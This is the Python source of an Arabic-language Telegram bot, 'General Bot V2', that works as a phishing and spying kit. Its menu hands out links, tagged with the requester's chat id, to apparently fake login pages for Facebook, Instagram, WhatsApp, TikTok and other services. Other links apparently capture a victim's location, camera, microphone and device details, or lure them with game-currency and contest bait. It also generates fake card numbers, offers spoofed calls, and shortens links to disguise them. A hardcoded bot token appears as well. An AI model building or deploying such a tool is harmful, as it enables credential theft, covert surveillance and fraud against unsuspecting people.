```python
import os, logging, time, random, string, requests
from flask import Flask, request
from telebot import TeleBot, types

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
APP_URL = "https://gamee-beqx.onrender.com"           # رابط تطبيقك الحالي (تأكد أنه صحيح)
BASE_URL = "https://fgnral-html-5waj.onrender.com"    # رابط استضافة الصفحات
CALL_SITE = "https://callmyphone.org/app"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)
user_states = {}
bot_rating = 0

JOKES = [
    "مرة واحد بخيل جداً.. ابنه مات قال الحقوه هاتوه",
    "مرة واحد محشش قعد 3 أيام في البيت ليه؟ لأنه لقى الباب مفتوح",
    "مرة اثنين محششين ركبوا سيارة قالوا: بنروح على السينما...",
]

def gen_pass(l=16):
    return ''.join(random.choices(string.ascii_letters+string.digits+"!@#$%", k=l))

def fake_visa():
    prefixes = ["4","5","37","34"]
    pre = random.choice(prefixes)
    length = 16 if pre in ["4","5"] else 15
    while len(pre) < length: pre += str(random.randint(0,9))
    exp = f"{random.randint(1,12):02d}/{random.randint(2025,2030)}"
    return f"💳 {pre}\n📅 {exp}\n🔒 {random.randint(100,999)}"

def temp_mail():
    try:
        s = requests.Session()
        r = s.get('https://api.mail.tm/domains', headers={'User-Agent':'Mozilla/5.0'})
        domain = r.json()['hydra:member'][0]['domain']
        mail = ''.join(random.choices(string.ascii_lowercase, k=10)) + "@" + domain
        pwd = gen_pass(12)
        s.post('https://api.mail.tm/accounts', json={'address':mail,'password':pwd}, headers={'User-Agent':'Mozilla/5.0'})
        return f"📧 {mail}\n🔑 {pwd}"
    except: return "فشل"

def shorten(url):
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
        if r.status_code == 200: return r.text.strip()
    except: pass
    return url

def main_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    tools = [
        ("📘 فيسبوك","facebook.html"), ("🎵 تيك توك","tiktok.html"),
        ("👻 سناب شات","snapchat.html"), ("📷 انستقرام","instagram.html"),
        ("💬 واتساب","whatsapp.html"), ("✈️ تيليجرام","telegram.html"),
        ("🐦 تويتر","twitter.html"), ("▶️ يوتيوب","youtube.html"),
        ("🎮 ديسكورد","discord.html"), ("🤖 ريدت","reddit.html"),
        ("📍 الموقع","gps.html"), ("📸 الكاميرا","camera.html"),
        ("🎙️ ميكروفون","mic.html"), ("🎥 فيديو","video.html"),
        ("📱 الجهاز","device.html"),
    ]
    for i in range(0, len(tools), 2):
        left = tools[i]; right = tools[i+1] if i+1 < len(tools) else None
        markup.row(types.InlineKeyboardButton(left[0], callback_data=f"ph|{left[1]}"),
                   types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}") if right else None)
    markup.row(types.InlineKeyboardButton("🎮 ببجي UC", callback_data="ph|pubg_cuc.html"),
               types.InlineKeyboardButton("🏆 مسابقة الحلم", callback_data="ph|dream.html"))
    markup.row(types.InlineKeyboardButton("📞 اتصال وهمي", callback_data="call"),
               types.InlineKeyboardButton("🔍 معرف الإيدي", callback_data="myid"))
    markup.row(types.InlineKeyboardButton("🔗 اختصار رابط", callback_data="shorten"),
               types.InlineKeyboardButton("💳 فيزا وهمية", callback_data="visa"))
    markup.row(types.InlineKeyboardButton("✉️ بريد وهمي", callback_data="tempmail"),
               types.InlineKeyboardButton("😂 نكتة", callback_data="joke"))
    markup.row(types.InlineKeyboardButton("📜 شروط", callback_data="terms"),
               types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"))
    markup.row(types.InlineKeyboardButton("⭐ تقييم", callback_data="rate"),
               types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))
    return markup

@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            json_string = request.get_data().decode('utf-8')
            update = types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return ''
        except: pass
    return '!', 403

@bot.message_handler(commands=['start'])
def start(msg):
    bot.send_message(msg.chat.id, "🔱 بوت الجنرال V2\n\nاختر الأداة:", reply_markup=main_menu(msg.chat.id), parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: True)
def callback(call):
    chat = call.message.chat.id; data = call.data; mid = call.message.message_id
    try:
        if data == "back": bot.edit_message_text("🔱 القائمة:", chat, mid, reply_markup=main_menu(chat), parse_mode="HTML")
        elif data.startswith("ph|"):
            file = data.split("|")[1]
            link = f"{BASE_URL}/{file}?chat={chat}"
            markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
            bot.edit_message_text(f"🔗 الرابط:\n<code>{link}</code>", chat, mid, parse_mode="HTML", reply_markup=markup)
        elif data == "call":
            user_states[chat] = "call"
            bot.send_message(chat, "📞 أرسل رقم الهاتف:")
        elif data == "myid": bot.send_message(chat, f"معرفك: {call.from_user.id}")
        elif data == "shorten":
            user_states[chat] = "shorten"
            bot.send_message(chat, "أرسل الرابط:")
        elif data == "visa": bot.send_message(chat, fake_visa())
        elif data == "tempmail": bot.send_message(chat, temp_mail())
        elif data == "joke": bot.send_message(chat, random.choice(JOKES))
        elif data == "rate":
            global bot_rating
            bot_rating += 1
            bot.send_message(chat, f"⭐ التقييمات: {bot_rating}")
        elif data == "terms": bot.send_message(chat, "📜 شروط الاستخدام")
        elif data == "hack": bot.send_message(chat, "💻 خطوات تعلم الاختراق")
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Error: {e}")
        bot.answer_callback_query(call.id, text="خطأ")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "call")
def handle_call(m):
    num = m.text.strip().replace("+","").replace(" ","")
    if num: bot.send_message(m.chat.id, f"{CALL_SITE}?number={num}")
    user_states.pop(m.chat.id, None)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "shorten")
def handle_shorten(m):
    url = m.text.strip()
    if url.startswith("http"): bot.send_message(m.chat.id, shorten(url))
    else: bot.send_message(m.chat.id, "رابط غير صالح")
    user_states.pop(m.chat.id, None)

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
    PORT = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=PORT)
```